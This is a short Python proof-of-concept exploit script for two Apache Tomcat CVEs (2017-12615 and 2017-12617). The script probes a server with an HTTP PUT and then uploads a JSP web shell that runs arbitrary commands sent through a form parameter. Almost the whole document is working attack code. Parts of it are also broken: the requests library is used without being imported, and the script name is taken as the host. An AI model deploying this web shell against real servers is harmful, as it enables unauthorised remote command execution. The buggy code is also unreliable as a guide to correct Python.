
#!/usr/bin/python
#Poc CVE-2017-12615 CVE-2017-12617
import urllib
#import http.client
import httplib
import sys
def check(host,path):
    resp=""
    try:
        conn = httplib.HTTPConnection(host)
        conn.request("PUT", path)
        return conn.getresponse().status
    except:
            return 'false'

def exploit(url):
    payload='<%@ page import="java.util.*,java.io.*"%> <HTML><BODY> <FORM METHOD="GET" NAME="myform" ACTION=""> <INPUT TYPE="text" NAME="cmd"> <INPUT TYPE="submit" VALUE="Send"> </FORM> <pre> <% if (request.getParameter("cmd") != null) { out.println("Command: " + request.getParameter("cmd") + "<BR>"); Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> </pre> </BODY></HTML>'
    response = requests.put(url, data=payload)
    print ("All work fine :)")

def main():
    print ("#########################################################\n")
    print ("\t\tPoc CVE-2017-12615 CVE-2017-12617 By zi0Black\n")
    print ("#########################################################\n\n\n")
    print ("Usage -----> python cve-2017-12615.py 127.0.0.1 /filename.jsp\n\n")
    if len(sys.argv)>1:
        host=sys.argv[0]
        path=sys.argv[1]
        resp = check(host,path)
        print ("Response: %s" % resp)
        if resp != 'false':
            exploit(host+path)
        else:
            print ("Web server is not vulnerable or WAF is enabled")
main()
